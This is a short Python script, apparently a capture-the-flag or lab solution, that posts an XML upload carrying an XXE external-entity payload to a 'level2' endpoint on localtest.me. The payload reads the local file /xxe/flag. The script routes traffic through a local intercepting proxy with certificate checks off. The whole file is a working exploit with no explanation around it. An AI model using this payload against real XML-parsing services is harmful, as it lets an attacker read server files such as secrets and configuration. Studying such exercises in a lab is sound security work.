import requests


if __name__ == '__main__':
    payload = '''<?xml version="1.0" encoding="UTF-16"?>
    <!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY file SYSTEM "file:///xxe/flag">
    ]>
    <foo>&file;</foo>'''

    sess = requests.Session()
    sess.verify = False
    sess.proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    url = "http://localtest.me:80/level2"

    files = {
        'file': ('file.xml', payload, 'text/xml')
    }
    # files = {
    #     'file': ('file.xml', payload.encode('utf16'), 'text/xml')
    # }
    resp = sess.post(url, files=files)
